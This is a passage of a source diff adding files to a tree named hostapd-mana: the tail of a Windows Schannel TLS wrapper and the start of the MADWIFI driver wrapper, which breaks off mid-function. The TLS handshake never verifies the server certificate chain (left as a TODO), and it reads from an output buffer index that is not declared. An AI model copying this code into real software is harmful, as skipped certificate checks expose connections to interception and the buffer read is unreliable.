> 	wpa_printf(MSG_DEBUG, "SChannel: %d bytes handshake data to process",
> 		   (int) wpabuf_len(in_data));
> 
> 	sspi_flags = ISC_REQ_REPLAY_DETECT |
> 		ISC_REQ_CONFIDENTIALITY |
> 		ISC_RET_EXTENDED_ERROR |
> 		ISC_REQ_ALLOCATE_MEMORY |
> 		ISC_REQ_MANUAL_CRED_VALIDATION;
> 
> 	/* Input buffer for Schannel */
> 	inbufs[0].pvBuffer = (u8 *) wpabuf_head(in_data);
> 	inbufs[0].cbBuffer = wpabuf_len(in_data);
> 	inbufs[0].BufferType = SECBUFFER_TOKEN;
> 
> 	/* Place for leftover data from Schannel */
> 	inbufs[1].pvBuffer = NULL;
> 	inbufs[1].cbBuffer = 0;
> 	inbufs[1].BufferType = SECBUFFER_EMPTY;
> 
> 	inbuf.cBuffers = 2;
> 	inbuf.pBuffers = inbufs;
> 	inbuf.ulVersion = SECBUFFER_VERSION;
> 
> 	/* Output buffer for Schannel */
> 	outbufs[0].pvBuffer = NULL;
> 	outbufs[0].cbBuffer = 0;
> 	outbufs[0].BufferType = SECBUFFER_TOKEN;
> 
> 	outbuf.cBuffers = 1;
> 	outbuf.pBuffers = outbufs;
> 	outbuf.ulVersion = SECBUFFER_VERSION;
> 
> #ifdef UNICODE
> 	status = global->sspi->InitializeSecurityContextW(
> 		&conn->creds, &conn->context, NULL, sspi_flags, 0,
> 		SECURITY_NATIVE_DREP, &inbuf, 0, NULL,
> 		&outbuf, &sspi_flags_out, &ts_expiry);
> #else /* UNICODE */
> 	status = global->sspi->InitializeSecurityContextA(
> 		&conn->creds, &conn->context, NULL, sspi_flags, 0,
> 		SECURITY_NATIVE_DREP, &inbuf, 0, NULL,
> 		&outbuf, &sspi_flags_out, &ts_expiry);
> #endif /* UNICODE */
> 
> 	wpa_printf(MSG_MSGDUMP, "Schannel: InitializeSecurityContext -> "
> 		   "status=%d inlen[0]=%d intype[0]=%d inlen[1]=%d "
> 		   "intype[1]=%d outlen[0]=%d",
> 		   (int) status, (int) inbufs[0].cbBuffer,
> 		   (int) inbufs[0].BufferType, (int) inbufs[1].cbBuffer,
> 		   (int) inbufs[1].BufferType,
> 		   (int) outbufs[0].cbBuffer);
> 	if (status == SEC_E_OK || status == SEC_I_CONTINUE_NEEDED ||
> 	    (FAILED(status) && (sspi_flags_out & ISC_RET_EXTENDED_ERROR))) {
> 		if (outbufs[0].cbBuffer != 0 && outbufs[0].pvBuffer) {
> 			wpa_hexdump(MSG_MSGDUMP, "SChannel - output",
> 				    outbufs[0].pvBuffer, outbufs[0].cbBuffer);
> 			out_buf = wpabuf_alloc_copy(outbufs[0].pvBuffer,
> 						    outbufs[0].cbBuffer);
> 			global->sspi->FreeContextBuffer(outbufs[0].pvBuffer);
> 			outbufs[0].pvBuffer = NULL;
> 			if (out_buf == NULL)
> 				return NULL;
> 		}
> 	}
> 
> 	switch (status) {
> 	case SEC_E_INCOMPLETE_MESSAGE:
> 		wpa_printf(MSG_DEBUG, "Schannel: SEC_E_INCOMPLETE_MESSAGE");
> 		break;
> 	case SEC_I_CONTINUE_NEEDED:
> 		wpa_printf(MSG_DEBUG, "Schannel: SEC_I_CONTINUE_NEEDED");
> 		break;
> 	case SEC_E_OK:
> 		/* TODO: verify server certificate chain */
> 		wpa_printf(MSG_DEBUG, "Schannel: SEC_E_OK - Handshake "
> 			   "completed successfully");
> 		conn->established = 1;
> 		tls_get_eap(global, conn);
> 
> 		/* Need to return something to get final TLS ACK. */
> 		if (out_buf == NULL)
> 			out_buf = wpabuf_alloc(0);
> 
> 		if (inbufs[1].BufferType == SECBUFFER_EXTRA) {
> 			wpa_hexdump(MSG_MSGDUMP, "SChannel - Encrypted "
> 				    "application data",
> 				    inbufs[1].pvBuffer, inbufs[1].cbBuffer);
> 			if (appl_data) {
> 				*appl_data = wpabuf_alloc_copy(
> 					outbufs[1].pvBuffer,
> 					outbufs[1].cbBuffer);
> 			}
> 			global->sspi->FreeContextBuffer(inbufs[1].pvBuffer);
> 			inbufs[1].pvBuffer = NULL;
> 		}
> 		break;
> 	case SEC_I_INCOMPLETE_CREDENTIALS:
> 		wpa_printf(MSG_DEBUG,
> 			   "Schannel: SEC_I_INCOMPLETE_CREDENTIALS");
> 		break;
> 	case SEC_E_WRONG_PRINCIPAL:
> 		wpa_printf(MSG_DEBUG, "Schannel: SEC_E_WRONG_PRINCIPAL");
> 		break;
> 	case SEC_E_INTERNAL_ERROR:
> 		wpa_printf(MSG_DEBUG, "Schannel: SEC_E_INTERNAL_ERROR");
> 		break;
> 	}
> 
> 	if (FAILED(status)) {
> 		wpa_printf(MSG_DEBUG, "Schannel: Handshake failed "
> 			   "(out_buf=%p)", out_buf);
> 		conn->failed++;
> 		global->sspi->DeleteSecurityContext(&conn->context);
> 		return out_buf;
> 	}
> 
> 	if (inbufs[1].BufferType == SECBUFFER_EXTRA) {
> 		/* TODO: Can this happen? What to do with this data? */
> 		wpa_hexdump(MSG_MSGDUMP, "SChannel - Leftover data",
> 			    inbufs[1].pvBuffer, inbufs[1].cbBuffer);
> 		global->sspi->FreeContextBuffer(inbufs[1].pvBuffer);
> 		inbufs[1].pvBuffer = NULL;
> 	}
> 
> 	return out_buf;
> }
> 
> 
> struct wpabuf * tls_connection_server_handshake(void *tls_ctx,
> 						struct tls_connection *conn,
> 						const struct wpabuf *in_data,
> 						struct wpabuf **appl_data)
> {
> 	return NULL;
> }
> 
> 
> struct wpabuf * tls_connection_encrypt(void *tls_ctx,
> 				       struct tls_connection *conn,
> 				       const struct wpabuf *in_data)
> {
> 	struct tls_global *global = tls_ctx;
> 	SECURITY_STATUS status;
> 	SecBufferDesc buf;
> 	SecBuffer bufs[4];
> 	SecPkgContext_StreamSizes sizes;
> 	int i;
> 	struct wpabuf *out;
> 
> 	status = global->sspi->QueryContextAttributes(&conn->context,
> 						      SECPKG_ATTR_STREAM_SIZES,
> 						      &sizes);
> 	if (status != SEC_E_OK) {
> 		wpa_printf(MSG_DEBUG, "%s: QueryContextAttributes failed",
> 			   __func__);
> 		return NULL;
> 	}
> 	wpa_printf(MSG_DEBUG, "%s: Stream sizes: header=%u trailer=%u",
> 		   __func__,
> 		   (unsigned int) sizes.cbHeader,
> 		   (unsigned int) sizes.cbTrailer);
> 
> 	out = wpabuf_alloc(sizes.cbHeader + wpabuf_len(in_data) +
> 			   sizes.cbTrailer);
> 
> 	os_memset(&bufs, 0, sizeof(bufs));
> 	bufs[0].pvBuffer = wpabuf_put(out, sizes.cbHeader);
> 	bufs[0].cbBuffer = sizes.cbHeader;
> 	bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
> 
> 	bufs[1].pvBuffer = wpabuf_put(out, 0);
> 	wpabuf_put_buf(out, in_data);
> 	bufs[1].cbBuffer = wpabuf_len(in_data);
> 	bufs[1].BufferType = SECBUFFER_DATA;
> 
> 	bufs[2].pvBuffer = wpabuf_put(out, sizes.cbTrailer);
> 	bufs[2].cbBuffer = sizes.cbTrailer;
> 	bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
> 
> 	buf.ulVersion = SECBUFFER_VERSION;
> 	buf.cBuffers = 3;
> 	buf.pBuffers = bufs;
> 
> 	status = global->sspi->EncryptMessage(&conn->context, 0, &buf, 0);
> 
> 	wpa_printf(MSG_MSGDUMP, "Schannel: EncryptMessage -> "
> 		   "status=%d len[0]=%d type[0]=%d len[1]=%d type[1]=%d "
> 		   "len[2]=%d type[2]=%d",
> 		   (int) status,
> 		   (int) bufs[0].cbBuffer, (int) bufs[0].BufferType,
> 		   (int) bufs[1].cbBuffer, (int) bufs[1].BufferType,
> 		   (int) bufs[2].cbBuffer, (int) bufs[2].BufferType);
> 	wpa_printf(MSG_MSGDUMP, "Schannel: EncryptMessage pointers: "
> 		   "out_data=%p bufs %p %p %p",
> 		   wpabuf_head(out), bufs[0].pvBuffer, bufs[1].pvBuffer,
> 		   bufs[2].pvBuffer);
> 
> 	for (i = 0; i < 3; i++) {
> 		if (bufs[i].pvBuffer && bufs[i].BufferType != SECBUFFER_EMPTY)
> 		{
> 			wpa_hexdump(MSG_MSGDUMP, "SChannel: bufs",
> 				    bufs[i].pvBuffer, bufs[i].cbBuffer);
> 		}
> 	}
> 
> 	if (status == SEC_E_OK) {
> 		wpa_printf(MSG_DEBUG, "%s: SEC_E_OK", __func__);
> 		wpa_hexdump_buf_key(MSG_MSGDUMP, "Schannel: Encrypted data "
> 				    "from EncryptMessage", out);
> 		return out;
> 	}
> 
> 	wpa_printf(MSG_DEBUG, "%s: Failed - status=%d",
> 		   __func__, (int) status);
> 	wpabuf_free(out);
> 	return NULL;
> }
> 
> 
> struct wpabuf * tls_connection_decrypt(void *tls_ctx,
> 				       struct tls_connection *conn,
> 				       const struct wpabuf *in_data)
> {
> 	struct tls_global *global = tls_ctx;
> 	SECURITY_STATUS status;
> 	SecBufferDesc buf;
> 	SecBuffer bufs[4];
> 	int i;
> 	struct wpabuf *out, *tmp;
> 
> 	wpa_hexdump_buf(MSG_MSGDUMP,
> 			"Schannel: Encrypted data to DecryptMessage", in_data);
> 	os_memset(&bufs, 0, sizeof(bufs));
> 	tmp = wpabuf_dup(in_data);
> 	if (tmp == NULL)
> 		return NULL;
> 	bufs[0].pvBuffer = wpabuf_mhead(tmp);
> 	bufs[0].cbBuffer = wpabuf_len(in_data);
> 	bufs[0].BufferType = SECBUFFER_DATA;
> 
> 	bufs[1].BufferType = SECBUFFER_EMPTY;
> 	bufs[2].BufferType = SECBUFFER_EMPTY;
> 	bufs[3].BufferType = SECBUFFER_EMPTY;
> 
> 	buf.ulVersion = SECBUFFER_VERSION;
> 	buf.cBuffers = 4;
> 	buf.pBuffers = bufs;
> 
> 	status = global->sspi->DecryptMessage(&conn->context, &buf, 0,
> 						    NULL);
> 	wpa_printf(MSG_MSGDUMP, "Schannel: DecryptMessage -> "
> 		   "status=%d len[0]=%d type[0]=%d len[1]=%d type[1]=%d "
> 		   "len[2]=%d type[2]=%d len[3]=%d type[3]=%d",
> 		   (int) status,
> 		   (int) bufs[0].cbBuffer, (int) bufs[0].BufferType,
> 		   (int) bufs[1].cbBuffer, (int) bufs[1].BufferType,
> 		   (int) bufs[2].cbBuffer, (int) bufs[2].BufferType,
> 		   (int) bufs[3].cbBuffer, (int) bufs[3].BufferType);
> 	wpa_printf(MSG_MSGDUMP, "Schannel: DecryptMessage pointers: "
> 		   "out_data=%p bufs %p %p %p %p",
> 		   wpabuf_head(tmp), bufs[0].pvBuffer, bufs[1].pvBuffer,
> 		   bufs[2].pvBuffer, bufs[3].pvBuffer);
> 
> 	switch (status) {
> 	case SEC_E_INCOMPLETE_MESSAGE:
> 		wpa_printf(MSG_DEBUG, "%s: SEC_E_INCOMPLETE_MESSAGE",
> 			   __func__);
> 		break;
> 	case SEC_E_OK:
> 		wpa_printf(MSG_DEBUG, "%s: SEC_E_OK", __func__);
> 		for (i = 0; i < 4; i++) {
> 			if (bufs[i].BufferType == SECBUFFER_DATA)
> 				break;
> 		}
> 		if (i == 4) {
> 			wpa_printf(MSG_DEBUG, "%s: No output data from "
> 				   "DecryptMessage", __func__);
> 			wpabuf_free(tmp);
> 			return NULL;
> 		}
> 		wpa_hexdump_key(MSG_MSGDUMP, "Schannel: Decrypted data from "
> 				"DecryptMessage",
> 				bufs[i].pvBuffer, bufs[i].cbBuffer);
> 		out = wpabuf_alloc_copy(bufs[i].pvBuffer, bufs[i].cbBuffer);
> 		wpabuf_free(tmp);
> 		return out;
> 	}
> 
> 	wpa_printf(MSG_DEBUG, "%s: Failed - status=%d",
> 		   __func__, (int) status);
> 	wpabuf_free(tmp);
> 	return NULL;
> }
> 
> 
> int tls_connection_resumed(void *ssl_ctx, struct tls_connection *conn)
> {
> 	return 0;
> }
> 
> 
> int tls_connection_set_cipher_list(void *tls_ctx, struct tls_connection *conn,
> 				   u8 *ciphers)
> {
> 	return -1;
> }
> 
> 
> int tls_get_cipher(void *ssl_ctx, struct tls_connection *conn,
> 		   char *buf, size_t buflen)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_enable_workaround(void *ssl_ctx,
> 				     struct tls_connection *conn)
> {
> 	return 0;
> }
> 
> 
> int tls_connection_client_hello_ext(void *ssl_ctx, struct tls_connection *conn,
> 				    int ext_type, const u8 *data,
> 				    size_t data_len)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_get_failed(void *ssl_ctx, struct tls_connection *conn)
> {
> 	if (conn == NULL)
> 		return -1;
> 	return conn->failed;
> }
> 
> 
> int tls_connection_get_read_alerts(void *ssl_ctx, struct tls_connection *conn)
> {
> 	if (conn == NULL)
> 		return -1;
> 	return conn->read_alerts;
> }
> 
> 
> int tls_connection_get_write_alerts(void *ssl_ctx, struct tls_connection *conn)
> {
> 	if (conn == NULL)
> 		return -1;
> 	return conn->write_alerts;
> }
> 
> 
> int tls_connection_set_params(void *tls_ctx, struct tls_connection *conn,
> 			      const struct tls_connection_params *params)
> {
> 	struct tls_global *global = tls_ctx;
> 	ALG_ID algs[1];
> 	SECURITY_STATUS status;
> 	TimeStamp ts_expiry;
> 
> 	if (conn == NULL)
> 		return -1;
> 
> 	if (global->my_cert_store == NULL &&
> 	    (global->my_cert_store = CertOpenSystemStore(0, TEXT("MY"))) ==
> 	    NULL) {
> 		wpa_printf(MSG_ERROR, "%s: CertOpenSystemStore failed - 0x%x",
> 			   __func__, (unsigned int) GetLastError());
> 		return -1;
> 	}
> 
> 	os_memset(&conn->schannel_cred, 0, sizeof(conn->schannel_cred));
> 	conn->schannel_cred.dwVersion = SCHANNEL_CRED_VERSION;
> 	conn->schannel_cred.grbitEnabledProtocols = SP_PROT_TLS1;
> 	algs[0] = CALG_RSA_KEYX;
> 	conn->schannel_cred.cSupportedAlgs = 1;
> 	conn->schannel_cred.palgSupportedAlgs = algs;
> 	conn->schannel_cred.dwFlags |= SCH_CRED_NO_DEFAULT_CREDS;
> #ifdef UNICODE
> 	status = global->sspi->AcquireCredentialsHandleW(
> 		NULL, UNISP_NAME_W, SECPKG_CRED_OUTBOUND, NULL,
> 		&conn->schannel_cred, NULL, NULL, &conn->creds, &ts_expiry);
> #else /* UNICODE */
> 	status = global->sspi->AcquireCredentialsHandleA(
> 		NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL,
> 		&conn->schannel_cred, NULL, NULL, &conn->creds, &ts_expiry);
> #endif /* UNICODE */
> 	if (status != SEC_E_OK) {
> 		wpa_printf(MSG_DEBUG, "%s: AcquireCredentialsHandleA failed - "
> 			   "0x%x", __func__, (unsigned int) status);
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> 
> unsigned int tls_capabilities(void *tls_ctx)
> {
> 	return 0;
> }
diff '--color=auto' -rN hostapd-2.6/src/drivers/driver_madwifi.c hostapd-mana/src/drivers/driver_madwifi.c
0a1,1309
> /*
>  * hostapd - driver interaction with MADWIFI 802.11 driver
>  * Copyright (c) 2004, Sam Leffler <sam@errno.com>
>  * Copyright (c) 2004, Video54 Technologies
>  * Copyright (c) 2004-2007, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  *
>  * This driver wrapper is only for hostapd AP mode functionality. Station
>  * (wpa_supplicant) operations with madwifi are supported by the driver_wext.c
>  * wrapper.
>  */
> 
> #include "includes.h"
> #include <sys/ioctl.h>
> 
> #include "common.h"
> #include "driver.h"
> #include "driver_wext.h"
> #include "eloop.h"
> #include "common/ieee802_11_defs.h"
> #include "linux_wext.h"
> 
> /*
>  * Avoid conflicts with wpa_supplicant definitions by undefining a definition.
>  */
> #undef WME_OUI_TYPE
> 
> #include <include/compat.h>
> #include <net80211/ieee80211.h>
> #ifdef WME_NUM_AC
> /* Assume this is built against BSD branch of madwifi driver. */
> #define MADWIFI_BSD
> #include <net80211/_ieee80211.h>
> #endif /* WME_NUM_AC */
> #include <net80211/ieee80211_crypto.h>
> #include <net80211/ieee80211_ioctl.h>
> 
> #ifdef CONFIG_WPS
> #ifdef IEEE80211_IOCTL_FILTERFRAME
> #include <netpacket/packet.h>
> 
> #ifndef ETH_P_80211_RAW
> #define ETH_P_80211_RAW 0x0019
> #endif
> #endif /* IEEE80211_IOCTL_FILTERFRAME */
> #endif /* CONFIG_WPS */
> 
> /*
>  * Avoid conflicts with hostapd definitions by undefining couple of defines
>  * from madwifi header files.
>  */
> #undef RSN_VERSION
> #undef WPA_VERSION
> #undef WPA_OUI_TYPE
> #undef WME_OUI_TYPE
> 
> 
> #ifdef IEEE80211_IOCTL_SETWMMPARAMS
> /* Assume this is built against madwifi-ng */
> #define MADWIFI_NG
> #endif /* IEEE80211_IOCTL_SETWMMPARAMS */
> 
> #define WPA_KEY_RSC_LEN 8
> 
> #include "priv_netlink.h"
> #include "netlink.h"
> #include "linux_ioctl.h"
> #include "l2_packet/l2_packet.h"
> 
> 
> struct madwifi_driver_data {
> 	struct hostapd_data *hapd;		/* back pointer */
> 
> 	char	iface[IFNAMSIZ + 1];
> 	int     ifindex;
> 	struct l2_packet_data *sock_xmit;	/* raw packet xmit socket */
> 	struct l2_packet_data *sock_recv;	/* raw packet recv socket */
> 	int	ioctl_sock;			/* socket for ioctl() use */
> 	struct netlink_data *netlink;
> 	int	we_version;
> 	u8	acct_mac[ETH_ALEN];
> 	struct hostap_sta_driver_data acct_data;
> 
> 	struct l2_packet_data *sock_raw; /* raw 802.11 management frames */
> };
> 
> static int madwifi_sta_deauth(void *priv, const u8 *own_addr, const u8 *addr,
> 			      int reason_code);
> 
> static int
> set80211priv(struct madwifi_driver_data *drv, int op, void *data, int len)
> {
> 	struct iwreq iwr;
> 	int do_inline = len < IFNAMSIZ;
> 
> 	memset(&iwr, 0, sizeof(iwr));
> 	os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
> #ifdef IEEE80211_IOCTL_FILTERFRAME
> 	/* FILTERFRAME must be NOT inline, regardless of size. */
> 	if (op == IEEE80211_IOCTL_FILTERFRAME)
> 		do_inline = 0;
> #endif /* IEEE80211_IOCTL_FILTERFRAME */
> 	if (op == IEEE80211_IOCTL_SET_APPIEBUF)
> 		do_inline = 0;
> 	if (do_inline) {
> 		/*
> 		 * Argument data fits inline; put it there.
> 		 */
> 		memcpy(iwr.u.name, data, len);
> 	} else {
> 		/*
> 		 * Argument data too big for inline transfer; setup a
> 		 * parameter block instead; the kernel will transfer
> 		 * the data for the driver.
> 		 */
> 		iwr.u.data.pointer = data;
> 		iwr.u.data.length = len;
> 	}
> 
> 	if (ioctl(drv->ioctl_sock, op, &iwr) < 0) {
> #ifdef MADWIFI_NG
> 		int first = IEEE80211_IOCTL_SETPARAM;
> 		static const char *opnames[] = {
> 			"ioctl[IEEE80211_IOCTL_SETPARAM]",
> 			"ioctl[IEEE80211_IOCTL_GETPARAM]",
> 			"ioctl[IEEE80211_IOCTL_SETMODE]",
> 			"ioctl[IEEE80211_IOCTL_GETMODE]",
> 			"ioctl[IEEE80211_IOCTL_SETWMMPARAMS]",
> 			"ioctl[IEEE80211_IOCTL_GETWMMPARAMS]",
> 			"ioctl[IEEE80211_IOCTL_SETCHANLIST]",
> 			"ioctl[IEEE80211_IOCTL_GETCHANLIST]",
> 			"ioctl[IEEE80211_IOCTL_CHANSWITCH]",
> 			"ioctl[IEEE80211_IOCTL_GET_APPIEBUF]",
> 			"ioctl[IEEE80211_IOCTL_SET_APPIEBUF]",
> 			"ioctl[IEEE80211_IOCTL_GETSCANRESULTS]",
> 			"ioctl[IEEE80211_IOCTL_FILTERFRAME]",
> 			"ioctl[IEEE80211_IOCTL_GETCHANINFO]",
> 			"ioctl[IEEE80211_IOCTL_SETOPTIE]",
> 			"ioctl[IEEE80211_IOCTL_GETOPTIE]",
> 			"ioctl[IEEE80211_IOCTL_SETMLME]",
> 			NULL,
> 			"ioctl[IEEE80211_IOCTL_SETKEY]",
> 			NULL,
> 			"ioctl[IEEE80211_IOCTL_DELKEY]",
> 			NULL,
> 			"ioctl[IEEE80211_IOCTL_ADDMAC]",
> 			NULL,
> 			"ioctl[IEEE80211_IOCTL_DELMAC]",
> 			NULL,
> 			"ioctl[IEEE80211_IOCTL_WDSMAC]",
> 			NULL,
> 			"ioctl[IEEE80211_IOCTL_WDSDELMAC]",
> 			NULL,
> 			"ioctl[IEEE80211_IOCTL_KICKMAC]",
> 		};
> #else /* MADWIFI_NG */
> 		int first = IEEE80211_IOCTL_SETPARAM;
> 		static const char *opnames[] = {
> 			"ioctl[IEEE80211_IOCTL_SETPARAM]",
> 			"ioctl[IEEE80211_IOCTL_GETPARAM]",
> 			"ioctl[IEEE80211_IOCTL_SETKEY]",
> 			"ioctl[SIOCIWFIRSTPRIV+3]",
> 			"ioctl[IEEE80211_IOCTL_DELKEY]",
> 			"ioctl[SIOCIWFIRSTPRIV+5]",
> 			"ioctl[IEEE80211_IOCTL_SETMLME]",
> 			"ioctl[SIOCIWFIRSTPRIV+7]",
> 			"ioctl[IEEE80211_IOCTL_SETOPTIE]",
> 			"ioctl[IEEE80211_IOCTL_GETOPTIE]",
> 			"ioctl[IEEE80211_IOCTL_ADDMAC]",
> 			"ioctl[SIOCIWFIRSTPRIV+11]",
> 			"ioctl[IEEE80211_IOCTL_DELMAC]",
> 			"ioctl[SIOCIWFIRSTPRIV+13]",
> 			"ioctl[IEEE80211_IOCTL_CHANLIST]",
> 			"ioctl[SIOCIWFIRSTPRIV+15]",
> 			"ioctl[IEEE80211_IOCTL_GETRSN]",
> 			"ioctl[SIOCIWFIRSTPRIV+17]",
> 			"ioctl[IEEE80211_IOCTL_GETKEY]",
> 		};
> #endif /* MADWIFI_NG */
> 		int idx = op - first;
> 		if (first <= op &&
> 		    idx < (int) ARRAY_SIZE(opnames) &&
> 		    opnames[idx])
> 			perror(opnames[idx]);
> 		else
> 			perror("ioctl[unknown???]");
> 		return -1;
> 	}
> 	return 0;
> }
> 
> static int
> set80211param(struct madwifi_driver_data *drv, int op, int arg)
> {
> 	struct iwreq iwr;
> 
> 	memset(&iwr, 0, sizeof(iwr));
> 	os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
> 	iwr.u.mode = op;
> 	memcpy(iwr.u.name+sizeof(__u32), &arg, sizeof(arg));
> 
> 	if (ioctl(drv->ioctl_sock, IEEE80211_IOCTL_SETPARAM, &iwr) < 0) {
> 		perror("ioctl[IEEE80211_IOCTL_SETPARAM]");
> 		wpa_printf(MSG_DEBUG, "%s: Failed to set parameter (op %d "
> 			   "arg %d)", __func__, op, arg);
> 		return -1;
> 	}
> 	return 0;
> }
> 
> #ifndef CONFIG_NO_STDOUT_DEBUG
> static const char *
> ether_sprintf(const u8 *addr)
> {
> 	static char buf[sizeof(MACSTR)];
> 
> 	if (addr != NULL)
> 		snprintf(buf, sizeof(buf), MACSTR, MAC2STR(addr));
> 	else
> 		snprintf(buf, sizeof(buf), MACSTR, 0,0,0,0,0,0);
> 	return buf;
> }
> #endif /* CONFIG_NO_STDOUT_DEBUG */
> 
> /*
>  * Configure WPA parameters.
>  */
> static int
> madwifi_configure_wpa(struct madwifi_driver_data *drv,
> 		      struct wpa_bss_params *params)
> {
> 	int v;
> 
> 	switch (params->wpa_group) {
> 	case WPA_CIPHER_CCMP:
> 		v = IEEE80211_CIPHER_AES_CCM;
> 		break;
> 	case WPA_CIPHER_TKIP:
> 		v = IEEE80211_CIPHER_TKIP;
> 		break;
> 	case WPA_CIPHER_WEP104:
> 		v = IEEE80211_CIPHER_WEP;
> 		break;
> 	case WPA_CIPHER_WEP40:
> 		v = IEEE80211_CIPHER_WEP;
> 		break;
> 	case WPA_CIPHER_NONE:
> 		v = IEEE80211_CIPHER_NONE;
> 		break;
> 	default:
> 		wpa_printf(MSG_ERROR, "Unknown group key cipher %u",
> 			   params->wpa_group);
> 		return -1;
> 	}
> 	wpa_printf(MSG_DEBUG, "%s: group key cipher=%d", __func__, v);
> 	if (set80211param(drv, IEEE80211_PARAM_MCASTCIPHER, v)) {
> 		printf("Unable to set group key cipher to %u\n", v);
> 		return -1;
> 	}
> 	if (v == IEEE80211_CIPHER_WEP) {
> 		/* key length is done only for specific ciphers */
> 		v = (params->wpa_group == WPA_CIPHER_WEP104 ? 13 : 5);
> 		if (set80211param(drv, IEEE80211_PARAM_MCASTKEYLEN, v)) {
> 			printf("Unable to set group key length to %u\n", v);
> 			return -1;
> 		}
> 	}
> 
> 	v = 0;
> 	if (params->wpa_pairwise & WPA_CIPHER_CCMP)
> 		v |= 1<<IEEE80211_CIPHER_AES_CCM;
> 	if (params->wpa_pairwise & WPA_CIPHER_TKIP)
> 		v |= 1<<IEEE80211_CIPHER_TKIP;
> 	if (params->wpa_pairwise & WPA_CIPHER_NONE)
> 		v |= 1<<IEEE80211_CIPHER_NONE;
> 	wpa_printf(MSG_DEBUG, "%s: pairwise key ciphers=0x%x", __func__, v);
> 	if (set80211param(drv, IEEE80211_PARAM_UCASTCIPHERS, v)) {
> 		printf("Unable to set pairwise key ciphers to 0x%x\n", v);
> 		return -1;
> 	}
> 
> 	wpa_printf(MSG_DEBUG, "%s: key management algorithms=0x%x",
> 		   __func__, params->wpa_key_mgmt);
> 	if (set80211param(drv, IEEE80211_PARAM_KEYMGTALGS,
> 			  params->wpa_key_mgmt)) {
> 		printf("Unable to set key management algorithms to 0x%x\n",
> 			params->wpa_key_mgmt);
> 		return -1;
> 	}
> 
> 	v = 0;
> 	if (params->rsn_preauth)
> 		v |= BIT(0);
> 	wpa_printf(MSG_DEBUG, "%s: rsn capabilities=0x%x",
> 		   __func__, params->rsn_preauth);
> 	if (set80211param(drv, IEEE80211_PARAM_RSNCAPS, v)) {
> 		printf("Unable to set RSN capabilities to 0x%x\n", v);
> 		return -1;
> 	}
> 
> 	wpa_printf(MSG_DEBUG, "%s: enable WPA=0x%x", __func__, params->wpa);
> 	if (set80211param(drv, IEEE80211_PARAM_WPA, params->wpa)) {
> 		printf("Unable to set WPA to %u\n", params->wpa);
> 		return -1;
> 	}
> 	return 0;
> }
> 
> static int
> madwifi_set_ieee8021x(void *priv, struct wpa_bss_params *params)
> {
> 	struct madwifi_driver_data *drv = priv;
> 
> 	wpa_printf(MSG_DEBUG, "%s: enabled=%d", __func__, params->enabled);
> 
> 	if (!params->enabled) {
> 		/* XXX restore state */
> 		return set80211param(priv, IEEE80211_PARAM_AUTHMODE,
> 			IEEE80211_AUTH_AUTO);
> 	}
> 	if (!params->wpa && !params->ieee802_1x) {
> 		wpa_printf(MSG_WARNING, "No 802.1X or WPA enabled!");
> 		return -1;
> 	}
> 	if (params->wpa && madwifi_configure_wpa(drv, params) != 0) {
> 		wpa_printf(MSG_WARNING, "Error configuring WPA state!");
> 		return -1;
> 	}
> 	if (set80211param(priv, IEEE80211_PARAM_AUTHMODE,
> 		(params->wpa ? IEEE80211_AUTH_WPA : IEEE80211_AUTH_8021X))) {
> 		wpa_printf(MSG_WARNING, "Error enabling WPA/802.1X!");
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> static int
> madwifi_set_privacy(void *priv, int enabled)
> {
> 	struct madwifi_driver_data *drv = priv;
> 
> 	wpa_printf(MSG_DEBUG, "%s: enabled=%d", __func__, enabled);
> 
> 	return set80211param(drv, IEEE80211_PARAM_PRIVACY, enabled);
> }
> 
> static int
> madwifi_set_sta_authorized(void *priv, const u8 *addr, int authorized)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct ieee80211req_mlme mlme;
> 	int ret;
> 
> 	wpa_printf(MSG_DEBUG, "%s: addr=%s authorized=%d",
> 		   __func__, ether_sprintf(addr), authorized);
> 
> 	if (authorized)
> 		mlme.im_op = IEEE80211_MLME_AUTHORIZE;
> 	else
> 		mlme.im_op = IEEE80211_MLME_UNAUTHORIZE;
> 	mlme.im_reason = 0;
> 	memcpy(mlme.im_macaddr, addr, IEEE80211_ADDR_LEN);
> 	ret = set80211priv(drv, IEEE80211_IOCTL_SETMLME, &mlme, sizeof(mlme));
> 	if (ret < 0) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to %sauthorize STA " MACSTR,
> 			   __func__, authorized ? "" : "un", MAC2STR(addr));
> 	}
> 
> 	return ret;
> }
> 
> static int
> madwifi_sta_set_flags(void *priv, const u8 *addr,
> 		      int total_flags, int flags_or, int flags_and)
> {
> 	/* For now, only support setting Authorized flag */
> 	if (flags_or & WPA_STA_AUTHORIZED)
> 		return madwifi_set_sta_authorized(priv, addr, 1);
> 	if (!(flags_and & WPA_STA_AUTHORIZED))
> 		return madwifi_set_sta_authorized(priv, addr, 0);
> 	return 0;
> }
> 
> static int
> madwifi_del_key(void *priv, const u8 *addr, int key_idx)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct ieee80211req_del_key wk;
> 	int ret;
> 
> 	wpa_printf(MSG_DEBUG, "%s: addr=%s key_idx=%d",
> 		   __func__, ether_sprintf(addr), key_idx);
> 
> 	memset(&wk, 0, sizeof(wk));
> 	if (addr != NULL) {
> 		memcpy(wk.idk_macaddr, addr, IEEE80211_ADDR_LEN);
> 		wk.idk_keyix = (u8) IEEE80211_KEYIX_NONE;
> 	} else {
> 		wk.idk_keyix = key_idx;
> 	}
> 
> 	ret = set80211priv(drv, IEEE80211_IOCTL_DELKEY, &wk, sizeof(wk));
> 	if (ret < 0) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to delete key (addr %s"
> 			   " key_idx %d)", __func__, ether_sprintf(addr),
> 			   key_idx);
> 	}
> 
> 	return ret;
> }
> 
> static int
> wpa_driver_madwifi_set_key(const char *ifname, void *priv, enum wpa_alg alg,
> 			   const u8 *addr, int key_idx, int set_tx,
> 			   const u8 *seq, size_t seq_len,
> 			   const u8 *key, size_t key_len)
> {
